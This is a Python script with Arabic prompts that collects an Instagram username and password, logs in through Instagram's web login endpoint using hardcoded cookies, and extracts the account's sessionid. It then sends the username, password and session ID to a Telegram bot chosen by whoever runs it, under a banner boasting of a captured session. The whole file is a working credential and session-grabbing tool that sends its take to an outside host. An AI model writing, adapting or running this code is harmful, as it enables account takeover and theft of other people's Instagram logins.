import requests
import time
import os
print('\033[1;32mWelcome to the future ')
print('\033[1;32mاهلا وسهلا بك في المستقبل')
print('')
print('\033[1;32mادخل توكن بوتك')
token=input('\033[1;31mT\033[1;32mO\033[1;33mK\033[1;34mE\033[1;36mN\033[1;35m :\033[1;32m ')
print('\n')
print('\033[1;32mادخل ايدي بوتك')
ID=input('\033[1;31mI\033[1;34mD \033[1;32m   : ')
print('')
linux = 'clear'
windows = 'cls'

L = "\033[1;95m"  #ارجواني
E = '\033[1;32m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فات

def login():
    time1=time.localtime()
    time2 = time.strftime("%d/%m/%Y")
    time3 = time.strftime("%H:%M:%S")
    print(f'{A}\033[1;32m[Date] :{Z} [{time2}]')
    print(f'{A}\033[1;32m[The time] :{Z} [{time3}]')
    print('')
    username = str(input(f"{F}username : "))
    password = str(input(f"{F}password : "))
    os.system([linux, windows][os.name == 'nt'])
    url = 'https://www.instagram.com/accounts/login/ajax/'
    data = {'username': f'{username}',
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'}            	
    headers = {'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '275',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': 'bc3d5af829ea',
    'x-requested-with': 'XMLHttpRequest'}		
    k = requests.post(url,headers=headers,data=data)
    if 'authenticated":true' in k.text or 'userId' in k.text:
        print(F+" login True")
        print(L+"="*60)
        os.system([linux, windows][os.name == 'nt'])
        sessionid = k.cookies['sessionid']
        print('تعال نادر جابلك سيزن ايدي شغال')
        print(f'⋘─────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏─────━⋙ \n❖ - username = {username}\n❖ - password = {password}\n❖ - sessionid = {sessionid}\n❖ - BY = @nader20090\n⋘─────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏─────━⋙')
        print('\033[1;32mتم ارسال السيزن الى البوت ')
        tlg = (f'''
        تعال نادر جابلك سيزن ايدي
⋘─────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏─────━⋙ 
❖ - username = {username}
❖ - password = {password}
❖ - sessionid = {sessionid}
❖ - BY = @nader20090
⋘─────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏─────━⋙
''')
        requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
    else:
        print(k.text)
        login()


login()